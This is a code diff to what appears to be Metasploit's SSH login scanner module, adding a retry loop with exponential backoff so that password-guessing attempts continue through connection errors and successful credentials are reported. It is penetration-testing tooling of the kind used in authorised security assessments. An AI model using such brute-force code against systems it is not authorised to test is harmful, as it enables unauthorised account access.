@@ -130,11 +130,28 @@ class Metasploit3 < Msf::Auxiliary
 		)
 	end
 
+	def rhost
+		datastore['RHOST']
+	end
+
+	def rport
+		datastore['RPORT']
+	end
+
 	def run_host(ip)
 		print_status("#{ip}:#{rport} - SSH - Starting buteforce")
 		each_user_pass do |user, pass|
 			vprint_status("#{ip}:#{rport} - SSH - Trying: username: '#{user}' with password: '#{pass}'")
-			ret,proof = do_login(ip,user,pass,rport)
+			this_attempt ||= 0
+			ret = nil
+			while this_attempt <=3 and (ret.nil? or ret == :connection_error or ret == :connection_disconnect)
+				if this_attempt > 0
+					select(nil,nil,nil,2**this_attempt) 
+					vprint_error "#{rhost}:#{rport} SSH - Retrying '#{user}':'#{pass}' due to connection error"
+				end
+				ret,proof = do_login(ip,user,pass,rport)
+				this_attempt += 1
+			end
 			case ret
 			when :success
 				print_good "#{ip}:#{rport} - SSH - Success: '#{user}':'#{pass}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
